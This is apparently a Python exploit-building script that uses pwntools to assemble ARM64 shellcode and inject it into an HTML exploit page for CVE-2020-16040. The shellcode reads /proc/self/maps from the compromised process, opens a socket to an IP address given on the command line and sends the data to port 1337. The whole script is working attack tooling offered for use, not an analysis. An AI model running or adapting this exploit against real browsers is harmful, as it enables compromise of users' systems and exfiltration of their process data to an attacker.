from pwn import *
import sys

context.arch = 'aarch64'

def bytes_to_js_array(data: bytes) -> str:
    return '[' + ', '.join(hex(n) for n in data) + ']'

def load_reg_64(reg: str, value: int) -> str:
    return f'''
movz {reg}, {value & 0xffff}, lsl #0
movk {reg}, {(value & 0xffff0000) >> 16}, lsl #16
movk {reg}, {(value & 0xffff00000000) >> 32}, lsl #32
movk {reg}, {(value & 0xffff000000000000) >> 48}, lsl #48
'''

def push_str_on_stack(data_str: str) -> str:
    data = data_str.encode() + b'\0'
    pad_len = 16 - (len(data) % 16)
    data = data.ljust(len(data) + pad_len, b'\0')

    out = ''
    for i in range(0, len(data), 16):
        n1 = u64(data[i:i+8])
        n2 = u64(data[i+8:i+16])

        out = f'''
sub sp, sp, #16
{load_reg_64('x0', n1)}
str x0, [sp, #0]
{load_reg_64('x0', n2)}
str x0, [sp, #8]
''' + out
    
    return out

def main():
    if len(sys.argv) != 2:
        print('Usage: gen_constants.py <remote_ip>')
        sys.exit(1)

    remote_ip_addr = sys.argv[1]
    parts = remote_ip_addr.split('.')
    assert len(parts) == 4

    ip_addr = sum(int(n) << (8 * i) for i, n in enumerate(reversed(parts)))
    print(hex(ip_addr))

    payload = f'''
    // Allocate a big stack buffer
    sub sp, sp, #0x4000         // Reserve 16KB
    mov x20, sp                 // x20 = buffer pointer

    {push_str_on_stack('/proc/self/maps')}

    // --- open("/proc/self/maps", O_RDONLY)
    mov x8, #56                 // sys_openat
    mov x0, xzr                 // AT_FDCWD
    mov x1, sp
    mov x2, #0                  // O_RDONLY
    svc #0
    mov x21, x0                 // Save fd

    // --- read(fd, buf, 0x4000)
    mov x0, x21                 // fd
    mov x1, x20                 // buf
    mov x2, #0x4000             // size
    mov x8, #63                 // sys_read
    svc #0
    mov x22, x0                 // Save read length

    // --- socket(AF_INET, SOCK_STREAM, 0)
    mov x0, #2                  // AF_INET
    mov x1, #1                  // SOCK_STREAM
    mov x2, #0                  // IPPROTO_IP
    mov x8, #198                // sys_socket
    svc #0
    mov x23, x0                 // Save socket fd

    // --- connect(fd, sockaddr, addrlen)
    // struct sockaddr_in {{
    //   sa_family=2, port=0x0539, addr=0x7f000001
    // }}
    sub sp, sp, #0x10
    mov x1, sp
    strh wzr, [x1, #0]          // zero init
    mov w0, #2                  // AF_INET
    strh w0, [x1]               // sa_family = AF_INET
    mov w0, #0x0539             // Port 1337 (network byte order)
    rev16 w0, w0
    strh w0, [x1, #2]           // sin_port

    // IP: 127.0.0.1 = 0x7f000001
    //mov w0, 0x7f000001
    {load_reg_64('x0', ip_addr)}
    rev w0, w0
    str w0, [x1, #4]            // sin_addr

    mov x0, x23                 // sockfd
    mov x2, #16                 // addrlen
    mov x8, #203                // sys_connect
    svc #0

    // --- send(sockfd, buf, len, 0)
    mov x0, x23                 // socket fd
    mov x1, x20                 // buffer
    mov x2, x22                 // length
    mov x3, #0                  // flags
    mov x4, #0
    mov x5, #0
    mov x8, #206                // sys_sendto (no sys_send on arm64)
    svc #0

    // --- exit(0)
    mov x0, #0
    mov x8, #93
    svc #0
    '''

    print(payload)

    payload = asm(payload)

    print(f'let shellcode = new Uint8Array({bytes_to_js_array(payload)});')

    with open('CVE-2020-16040_template.html', 'r') as f:
        data = f.read()
        new_data = data.replace('{{shellcode}}', bytes_to_js_array(payload))

    with open('CVE-2020-16040.html', 'w') as f:
        f.write(new_data)

if __name__ == '__main__':
    main()
